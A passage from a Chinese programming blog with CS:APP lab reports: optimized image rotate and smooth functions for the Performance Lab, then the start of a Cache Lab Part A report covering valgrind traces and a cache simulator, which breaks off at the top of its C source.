<p>旋转操作被定义为将图片逆时针旋转90°，旋转可以分为两步实现——</p>
<ol>
<li>将矩阵转置，即将M(i, j)变为M(j, i)</li>
<li>将矩阵的第i行和第N - i - 1交换</li>
</ol>
<p>平滑操作被定义为将每一个像素点的值换位周围像素点（以该像素点为中心的最多3*3的正方形）的平均值。</p>
<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p>在本实验中像素（pixel）是一个定义如下的结构体：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">The core data structure deals with image representation. A pixel is a <span class="class"><span class="keyword">struct</span> <span class="title">as</span> <span class="title">shown</span> <span class="title">below</span>:</span></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> red;    <span class="comment">/* R value */</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> green;  <span class="comment">/* G value */</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> blue;   <span class="comment">/* B value */</span></div><div class="line">&#125; pixel;</div></pre></td></tr></table></figure></p>
<p>此外，为了简化起见，还定义了如下的宏：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> RIDX(i,j,n) ((i)*(n)+(j))</span></div></pre></td></tr></table></figure></p>
<p>旋转操作的朴素版本如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">naive_rotate</span><span class="params">(<span class="keyword">int</span> dim, pixel *src, pixel *dst)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> i, j;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; dim; i++)</div><div class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j &lt; dim; j++)</div><div class="line">            dst[RIDX(dim<span class="number">-1</span>-j,i,dim)] = src[RIDX(i,j,dim)];</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>平滑操作的朴素版本如下（辅助函数未列出）：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">naive_smooth</span><span class="params">(<span class="keyword">int</span> dim, pixel *src, pixel *dst)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> i, j;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; dim; i++)</div><div class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j &lt; dim; j++)</div><div class="line">            dst[RIDX(i,j,dim)] = avg(dim, i, j, src); <span class="comment">/* Smooth the (i,j)th pixel */</span></div><div class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>为了简化起见，你可以假设所有的矩阵的边长都是32的倍数，并且在进行正确性测试的时候，只会测试5个值。</p>
<p>具体的注册函数和自动跑分机制请参阅实验讲义。</p>
<h2 id="实验思路"><a href="#实验思路" class="headerlink" title="实验思路"></a>实验思路</h2><p>旋转操作：旋转操作不涉及复杂的计算，经过测试将代码移动所带来的性能提升微乎其微。主要应当采用分块的手段提高代码的空间局部性的利用率。</p>
<p>平滑操作（平滑操作参考了别人的思路）：平滑操作是计算密集型函数，经过测试，通过减少过程调用以及代码移动带来的有限的性能提升。<br>观察原始代码可以发现分支预测的惩罚是巨大的（因为循环只会执行3次，会带来大量的预测不命中）。我们可以考虑将红、绿、蓝三色的值的计算分开地并行处理，并且依次处理四个角、四条边、和剩余的像素点。以提升局部性的利用率并且降低分支预测不命中所带来的惩罚。</p>
<h2 id="实验答案"><a href="#实验答案" class="headerlink" title="实验答案"></a>实验答案</h2><p>旋转操作：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">block_rotate</span><span class="params">(<span class="keyword">int</span> dim, pixel * src, pixel * dst)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> i, j, k, l;</div><div class="line">    <span class="keyword">int</span> cst0 = dim - <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span> ; i &lt; dim ; i += <span class="number">8</span>) &#123;</div><div class="line">        <span class="keyword">for</span> (j = <span class="number">0</span> ; j &lt; dim ; j += <span class="number">8</span>) &#123;</div><div class="line">            <span class="keyword">for</span> (k = i ; k &lt; i + <span class="number">8</span> ; k++) &#123;</div><div class="line">                <span class="keyword">for</span> (l = j ; l &lt; j + <span class="number">8</span> ; l++) &#123;</div><div class="line">                    dst[RIDX(cst0 - l, k, dim)] = src[RIDX(k, l, dim)];</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>平滑操作：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">optimized_smooth</span><span class="params">(<span class="keyword">int</span> dim, pixel * src, pixel * dst)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> i, j;</div><div class="line">    <span class="keyword">int</span> tmp;</div><div class="line"></div><div class="line">    dst[<span class="number">0</span>].red = (src[<span class="number">0</span>].red + src[<span class="number">1</span>].red + src[dim].red + src[dim + <span class="number">1</span>].red) &gt;&gt; <span class="number">2</span>;</div><div class="line">    dst[<span class="number">0</span>].green = (src[<span class="number">0</span>].green + src[<span class="number">1</span>].green + src[dim].green + src[dim + <span class="number">1</span>].green) &gt;&gt; <span class="number">2</span>;</div><div class="line">    dst[<span class="number">0</span>].blue = (src[<span class="number">0</span>].blue + src[<span class="number">1</span>].blue + src[dim].blue + src[dim + <span class="number">1</span>].blue) &gt;&gt; <span class="number">2</span>;</div><div class="line">    i = dim - <span class="number">1</span>;</div><div class="line">    dst[i].red = (src[i].red + src[i - <span class="number">1</span>].red + src[i + dim].red + src[i + dim <span class="number">-1</span>].red) &gt;&gt; <span class="number">2</span>;</div><div class="line">    dst[i].green = (src[i].green + src[i - <span class="number">1</span>].green + src[i + dim].green + src[i + dim <span class="number">-1</span>].green) &gt;&gt; <span class="number">2</span>;</div><div class="line">    dst[i].blue = (src[i].blue + src[i - <span class="number">1</span>].blue + src[i + dim].blue + src[i + dim <span class="number">-1</span>].blue) &gt;&gt; <span class="number">2</span>;</div><div class="line">    i = i * dim;</div><div class="line">    dst[i].red = (src[i].red + src[i + <span class="number">1</span>].red + src[i - dim].red + src[i - dim + <span class="number">1</span>].red) &gt;&gt; <span class="number">2</span>;</div><div class="line">    dst[i].green = (src[i].green + src[i + <span class="number">1</span>].green + src[i - dim].green + src[i - dim + <span class="number">1</span>].green) &gt;&gt; <span class="number">2</span>;</div><div class="line">    dst[i].blue = (src[i].blue + src[i + <span class="number">1</span>].blue + src[i - dim].blue + src[i - dim + <span class="number">1</span>].blue) &gt;&gt; <span class="number">2</span>;</div><div class="line">    i = i + dim - <span class="number">1</span>;</div><div class="line">    dst[i].red = (src[i].red + src[i - <span class="number">1</span>].red + src[i - dim].red + src[i - dim - <span class="number">1</span>].red) &gt;&gt; <span class="number">2</span>;</div><div class="line">    dst[i].green = (src[i].green + src[i - <span class="number">1</span>].green + src[i - dim].green + src[i - dim - <span class="number">1</span>].green) &gt;&gt; <span class="number">2</span>;</div><div class="line">    dst[i].blue = (src[i].blue + src[i - <span class="number">1</span>].blue + src[i - dim].blue + src[i - dim - <span class="number">1</span>].blue) &gt;&gt; <span class="number">2</span>;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span> ; i &lt; dim - <span class="number">1</span> ; i++) &#123;</div><div class="line">        dst[i].red = (src[i].red + src[i - <span class="number">1</span>].red + src[i + <span class="number">1</span>].red + src[i + dim].red + src[i + dim - <span class="number">1</span>].red + src[i + dim + <span class="number">1</span>].red) / <span class="number">6</span>;</div><div class="line">        dst[i].green = (src[i].green + src[i - <span class="number">1</span>].green + src[i + <span class="number">1</span>].green + src[i + dim].green + src[i + dim - <span class="number">1</span>].green + src[i + dim + <span class="number">1</span>].green) / <span class="number">6</span>;</div><div class="line">        dst[i].blue = (src[i].blue + src[i - <span class="number">1</span>].blue + src[i + <span class="number">1</span>].blue + src[i + dim].blue + src[i + dim - <span class="number">1</span>].blue + src[i + dim + <span class="number">1</span>].blue) / <span class="number">6</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (i = dim * (dim - <span class="number">1</span>) + <span class="number">1</span> ; i &lt; dim * dim - <span class="number">1</span> ; i++) &#123;</div><div class="line">        dst[i].red = (src[i].red + src[i - <span class="number">1</span>].red + src[i + <span class="number">1</span>].red + src[i - dim].red + src[i - dim - <span class="number">1</span>].red + src[i - dim + <span class="number">1</span>].red) / <span class="number">6</span>;</div><div class="line">        dst[i].green = (src[i].green + src[i - <span class="number">1</span>].green + src[i + <span class="number">1</span>].green + src[i - dim].green + src[i - dim - <span class="number">1</span>].green + src[i - dim + <span class="number">1</span>].green) / <span class="number">6</span>;</div><div class="line">        dst[i].blue = (src[i].blue + src[i - <span class="number">1</span>].blue + src[i + <span class="number">1</span>].blue+ src[i - dim].blue + src[i - dim - <span class="number">1</span>].blue+ src[i - dim + <span class="number">1</span>].blue) / <span class="number">6</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (j = dim ; j &lt; dim * (dim - <span class="number">1</span>) ; j+= dim) &#123;</div><div class="line">        dst[j].red = (src[j].red + src[j + <span class="number">1</span>].red + src[j - dim].red + src[j - dim + <span class="number">1</span>].red + src[j + dim].red + src[j + dim + <span class="number">1</span>].red) / <span class="number">6</span>;</div><div class="line">        dst[j].green = (src[j].green + src[j + <span class="number">1</span>].green + src[j - dim].green+ src[j - dim + <span class="number">1</span>].green + src[j + dim].green + src[j + dim + <span class="number">1</span>].green) / <span class="number">6</span>;</div><div class="line">        dst[j].blue = (src[j].blue + src[j + <span class="number">1</span>].blue + src[j - dim].blue + src[j - dim + <span class="number">1</span>].blue + src[j + dim].blue + src[j + dim + <span class="number">1</span>].blue) / <span class="number">6</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (j = <span class="number">2</span> * dim - <span class="number">1</span> ; j &lt; dim * dim - <span class="number">1</span> ; j += dim) &#123;</div><div class="line">        dst[j].red = (src[j].red + src[j - <span class="number">1</span>].red + src[j - dim].red + src[j - dim - <span class="number">1</span>].red + src[j + dim].red + src[j + dim - <span class="number">1</span>].red) / <span class="number">6</span>;</div><div class="line">        dst[j].green = (src[j].green + src[j - <span class="number">1</span>].green + src[j - dim].green + src[j - dim - <span class="number">1</span>].green + src[j + dim].green + src[j + dim - <span class="number">1</span>].green) / <span class="number">6</span>;</div><div class="line">        dst[j].blue = (src[j].blue + src[j - <span class="number">1</span>].blue + src[j - dim].blue + src[j - dim - <span class="number">1</span>].blue + src[j + dim].blue + src[j + dim - <span class="number">1</span>].blue) / <span class="number">6</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span> ; i &lt; dim - <span class="number">1</span> ; i++) &#123;</div><div class="line">        <span class="keyword">for</span> (j = <span class="number">1</span> ; j &lt; dim - <span class="number">1</span> ; j++) &#123;</div><div class="line">            tmp = i * dim + j;</div><div class="line">            dst[tmp].red = (src[tmp].red + src[tmp - <span class="number">1</span>].red + src[tmp + <span class="number">1</span>].red + src[tmp - dim].red + src[tmp - dim - <span class="number">1</span>].red + src[tmp - dim + <span class="number">1</span>].red + src[tmp + dim].red + src[tmp + dim - <span class="number">1</span>].red + src[tmp + dim + <span class="number">1</span>].red) / <span class="number">9</span>;</div><div class="line">            dst[tmp].green = (src[tmp].green + src[tmp - <span class="number">1</span>].green + src[tmp + <span class="number">1</span>].green + src[tmp - dim].green + src[tmp - dim - <span class="number">1</span>].green + src[tmp - dim + <span class="number">1</span>].green + src[tmp + dim].green + src[tmp + dim - <span class="number">1</span>].green + src[tmp + dim + <span class="number">1</span>].green) / <span class="number">9</span>;</div><div class="line">            dst[tmp].blue = (src[tmp].blue + src[tmp - <span class="number">1</span>].blue + src[tmp + <span class="number">1</span>].blue + src[tmp - dim].blue + src[tmp - dim - <span class="number">1</span>].blue + src[tmp - dim + <span class="number">1</span>].blue + src[tmp + dim].blue + src[tmp + dim - <span class="number">1</span>].blue + src[tmp + dim + <span class="number">1</span>].blue) / <span class="number">9</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>实验的第一部分对于缓存的要求不是很高，简单的分块可以带来很大的性能提升。</p>
<p>实验的第二部分实际上我是卡了比较久的，在发现减少过程调用和代码移动性能提升有限后我就卡住了，因为我发现似乎无法进行循环展开。实际上还是太生疏了，没有想到要分析性能瓶颈，最后参考了别人的答案，实际上看到了别人答案的一瞬间就豁然开朗了，但是在这之前完全没有想到会是分支预测的问题。还需要多加练习。</p>

                    
                        

                    
                    
                        <p>
                            <a href="/2017/07/20/深入理解计算机系统PerformanceLab实验报告/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title" itemprop="headline">
                    
                        <a class="link-unstyled" href="/2017/07/08/深入理解计算机系统CacheLab-PartA实验报告/">
                            深入理解计算机系统CacheLab-PartA实验报告
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time itemprop="datePublished" datetime="2017-07-08T17:55:51+08:00">
	
		    7月 08, 2017
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/计算机系统/">计算机系统</a>


    
</div>

            </div>
            
                <div class="postShorten-content" itemprop="articleBody">
                    <p>实验答案托管在我的<a href="https://github.com/BlackDragonF/CSAPPLabs/tree/master/CacheLab" target="_blank" rel="external">GitHub</a>上</p>
<blockquote>
<p>考完试之后一直比较颓废，本来想看完《深入理解计算机系统》的第5章——优化程序性能之后就赶快来做实验的，后来发现无论是Cache Lab还是Performance Lab都需要第6章——存储器层次结构的知识。看了几天的书，又磨蹭了几天，终于把Cache Lab的Part A写完了，总结如下。</p>
</blockquote>
<h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><p>Cache Lab - Understanding Cache Memories主要是有关缓存的实验，对应于书本的第6章：存储器层次结构。主要阐明了缓存对于C语言程序的性能影响。</p>
<p>本实验主要分为两个部分。第一个部分要求完成一个C语言程序用来模拟缓存的行为；而第二个部分要求优化一个小的矩阵变换函数，使其具有尽可能小的缓存不命中率。</p>
<p>关于本实验的具体介绍详见<a href="http://csapp.cs.cmu.edu/3e/archlab32-handout.tar" target="_blank" rel="external">实验讲义</a>。</p>
<h2 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h2><p>实验讲义中的traces子文件夹下包含了一组reference trace files，用来作为评估Part A中缓存模拟器正确性的样例数据。这些文件是由valgrind生成的。</p>
<p>Valgrind是一个用于内存调试，内存泄露以及性能分析的软件。例如，我们输入如下的命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">linux&gt; valgrind --<span class="built_in">log</span>-fd=1 --tool=lackey -v --trace-mem=yes ls -l</div></pre></td></tr></table></figure><br>valgrind会在命令行中执行ls -l命令并且按照顺序记录该命令的每一次内存访问，并且将其输出到标准输出流中。</p>
<p>下面是一个valgrind的输出样例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">I 0400d7d4,8</div><div class="line"> M 0421c7f0,4</div><div class="line"> L 04f6b868,8</div><div class="line"> S 7ff0005c8,8</div></pre></td></tr></table></figure></p>
<p>每一行的基本格式如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[空格]操作 地址,大小</div></pre></td></tr></table></figure><br>操作代表了内存访问的种类，<code>&#39;I&#39;</code>代表的是指令加载，<code>&#39;L&#39;</code>代表的是数据加载，<code>&#39;S&#39;</code>代表的是数据存储，<code>&#39;M&#39;</code>代表的是数据修改（如一条数据加载之后紧跟着数据存储）。在<code>&#39;I&#39;</code>之前永远没有空格，而其他的操作前必定有前置空格。<br>地址代表的是一个64位的16进制内存地址。<br>大小指明了该次内存访问涉及的字节数。</p>
<h2 id="实验要求-Part-A"><a href="#实验要求-Part-A" class="headerlink" title="实验要求 - Part A"></a>实验要求 - Part A</h2><p>在Part A中你需要在csim.c中实现一个LRU驱逐机制的缓存模拟器，该模拟器接收valgrind的trace作为输入，模拟一个缓存在该情况下的命中/不命中情况，并且输出所有的命中，不命中以及驱逐的次数。</p>
<p>本实验已经提供了一个用来参考的缓存模拟器csim-ref，其使用方式以及输出如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">Usage: ./csim-ref [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;</div><div class="line">• -h: Optional <span class="built_in">help</span> flag that prints usage info</div><div class="line">• -v: Optional verbose flag that displays trace info</div><div class="line">• -s &lt;s&gt;: Number of <span class="built_in">set</span> index bits (S = 2 s is the number of sets)</div><div class="line">• -E &lt;E&gt;: Associativity (number of lines per <span class="built_in">set</span>)</div><div class="line">• -b &lt;b&gt;: Number of block bits (B = 2 b is the block size)</div><div class="line">• -t &lt;tracefile&gt;: Name of the valgrind trace to replay</div><div class="line"></div><div class="line">linux&gt; ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace</div><div class="line">hits:4 misses:5 evictions:3</div><div class="line"></div><div class="line">linux&gt; ./csim-ref -v -s 4 -E 1 -b 4 -t traces/yi.trace</div><div class="line">L 10,1 miss</div><div class="line">M 20,1 miss hit</div><div class="line">L 22,1 hit</div><div class="line">S 18,1 hit</div><div class="line">L 110,1 miss eviction</div><div class="line">L 210,1 miss eviction</div><div class="line">M 12,1 miss eviction hit</div><div class="line">hits:4 misses:5 evictions:3</div></pre></td></tr></table></figure></p>
<p>对于Part A有以下的要求和限制：</p>
<ol>
<li>所写的程序编译时不能有任何的警告</li>
<li>能应对不同s，E和b的缓存生成对应的结果，这要求使用malloc来为你的数据结构分配空间</li>
<li>不需要考虑指令加载的缓存情况</li>
<li>调用printSummary打印最终的结果</li>
<li>假定数据已经适当对齐，不会出现一次数据加载跨区块的情况。这样，你可以忽略trace中的大小</li>
</ol>
<p>除此以外，实验的自学者讲义中还包含了一些提示，这里就不再赘述。</p>
<p>完成了Part A之后，可以用<code>make clean &amp;&amp; make</code>进行编译，并且用<code>./test-csim</code>进行自动评分，总共有8组样例，共27分满分。</p>
<h2 id="实验过程-Part-A"><a href="#实验过程-Part-A" class="headerlink" title="实验过程 - Part A"></a>实验过程 - Part A</h2><h3 id="实验思路"><a href="#实验思路" class="headerlink" title="实验思路"></a>实验思路</h3><p>整个模拟器在思路上可以进行如下的拆分：</p>
<h4 id="1-命令行参数解析"><a href="#1-命令行参数解析" class="headerlink" title="1.命令行参数解析"></a>1.命令行参数解析</h4><p>由于该模拟器是命令行程序并且接受命令行参数，因此需要能对命令行参数进行解析和处理，这里推荐使用getopt进行参数的解析。并且根据不同的参数执行不同的控制流，并且处理一些基本的错误如参数缺失以及参数类型错误。</p>
<h4 id="2-数据结构"><a href="#2-数据结构" class="headerlink" title="2.数据结构"></a>2.数据结构</h4><p>这是整个模拟器最基本的部分。我们需要创建合适的数据结构来模拟缓存，该数据结构不仅要能模拟缓存的数据的实际组织方式（有效位，标志位以及行和块等等），还需要考虑到LRU的驱逐机制。</p>
<h4 id="3-文件中内存访问记录的处理和解析"><a href="#3-文件中内存访问记录的处理和解析" class="headerlink" title="3.文件中内存访问记录的处理和解析"></a>3.文件中内存访问记录的处理和解析</h4><p>这个是模拟器中核心的部分。模拟器的功能就是从文件中接收内存访问记录，并且根据这些记录来模拟缓存的行为，操作我们所设计的缓存的数据结构。</p>
<h3 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h3><p>该代码仅供参考，很可能并不是一个非常好的解法。如果你也在面对同样的实验，<strong>请不要抄袭</strong>，毕竟抄袭是不会使你变得更强的:)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div><div class="line">334</div><div class="line">335</div><div class="line">336</div><div class="line">337</div><div class="line">338</div><div class="line">339</div><div class="line">340</div><div class="line">341</div><div class="line">342</div><div class="line">343</div><div class="line">344</div><div class="line">345</div><div class="line">346</div><div class="line">347</div><div class="line">348</div><div class="line">349</div><div class="line">350</div><div class="line">351</div><div class="line">352</div><div class="line">353</div><div class="line">354</div><div class="line">355</div><div class="line">356</div><div class="line">357</div><div class="line">358</div><div class="line">359</div><div class="line">360</div><div class="line">361</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* include necessary headers */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"cachelab.h"</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"getopt.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdlib.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unistd.h"</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"string.h"</span></span></div><div class="line"></div><div class="line"><span 